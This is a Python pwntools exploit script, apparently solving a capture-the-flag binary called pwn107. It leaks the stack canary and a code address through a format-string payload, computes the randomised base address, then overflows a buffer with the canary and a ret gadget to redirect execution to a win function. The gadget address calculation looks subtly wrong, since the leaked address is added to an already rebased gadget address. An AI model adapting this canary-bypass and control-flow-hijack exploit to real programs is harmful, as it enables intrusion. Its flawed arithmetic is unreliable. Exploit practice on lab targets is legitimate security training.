#!/usr/bin/python3
from pwn import *
from time import sleep


context.binary = binary = ELF("pwn107.pwn107", checksec=False)
libc_csu = binary.symbols.__libc_csu_init # get the address for the libc csu init function
context.log_level = "debug"

print("libc csu init: ", format(hex(libc_csu)))

p = process()
#p.clean()
#p = remote("10.10.247.160", 9007)
#p.recvuntil(b"streak?")
# receive bytes until the first input

memleak = b"%10$lX.%13$lX"
p.sendline(memleak)
# send payload for memleak

p.recvuntil(b"streak:")
output = p.recvline().split()
print(output)
# receive bytes until the memleak and save the memleak to the output variable


libc_csu_addr = int(output[0], 16)
canary = int(output[1], 16)

# parsing the output at the . splitting it into 2 outputs 0 being the libc_csu_addr
# and the second being the stack canary, we make this base16 aka hex


print("libc addr: {}\nCanary: {}".format(hex(libc_csu_addr), hex(canary)))
#sleep(1)
print("...shoving the canary up its own ass...")
#sleep(2)

dynamic_base_address = libc_csu_addr - libc_csu
# we get the dynamic base addr by subtracting by the leaked address and the static value
binary.address = dynamic_base_address
# now every refrence will start at the dynamic base addr

# we begin to write at RBP-20
# when we reach RBP-8 we place the value of the canary
# more bytes to overwrite RBP then put get_streak() in the instruction pointer
# this means we need to write 18 bytes to reach the canary and then overwrite RBP and finally hijack control flow

get_streak = binary.symbols.get_streak
# get the win() function

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0] # get the first ret rop gadget it can find

payload = b"A" * 24 # padd until canary
payload += p64(canary) # canary value (making canary think it's looking at itself)
payload += b"B" * 8 # bytes to overwrite RBP
payload += p64(libc_csu_addr + ret) # ret gadget
payload += p64(get_streak) # call win


p.sendline(payload)
p.interactive()
